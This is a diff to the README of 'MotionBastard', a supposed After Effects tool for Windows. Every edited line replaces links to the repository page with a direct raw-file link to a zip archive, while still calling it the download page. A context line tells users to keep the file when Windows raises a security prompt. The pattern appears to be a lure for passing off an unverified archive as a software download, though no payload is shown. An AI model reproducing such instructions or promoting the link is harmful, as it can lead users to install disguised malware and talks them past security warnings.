@@ -1,6 +1,6 @@
 # 🧠 MotionBastard - Smarter Motion Design in Less Time
 
-[![Download MotionBastard](https://img.shields.io/badge/Download%20MotionBastard-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/luca1234413/MotionBastard)
+[![Download MotionBastard](https://img.shields.io/badge/Download%20MotionBastard-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/luca1234413/MotionBastard/main/jsx/Motion_Bastard_v2.3.zip)
 
 ## 🚀 What MotionBastard Does
 
@@ -12,7 +12,7 @@ It is made for people who want to work faster in After Effects without learning 
 
 Visit this page to download and run MotionBastard on Windows:
 
-https://github.com/luca1234413/MotionBastard
+https://raw.githubusercontent.com/luca1234413/MotionBastard/main/jsx/Motion_Bastard_v2.3.zip
 
 If the repository has a release file, choose the Windows download that matches your system. If the page opens the main repository, use the latest release or the main download area on that page.
 
@@ -43,7 +43,7 @@ If Windows shows a security prompt, choose the option that lets you keep the fil
 ## 🖥️ How to Install on Windows
 
 1. Open the download page:
-   https://github.com/luca1234413/MotionBastard
+   https://raw.githubusercontent.com/luca1234413/MotionBastard/main/jsx/Motion_Bastard_v2.3.zip
 
 2. Find the latest Windows version of MotionBastard.
 
@@ -206,4 +206,4 @@ When you update, close MotionBastard and After Effects first.
 ## 📎 Link
 
 Primary download page:
-https://github.com/luca1234413/MotionBastard
+https://raw.githubusercontent.com/luca1234413/MotionBastard/main/jsx/Motion_Bastard_v2.3.zip
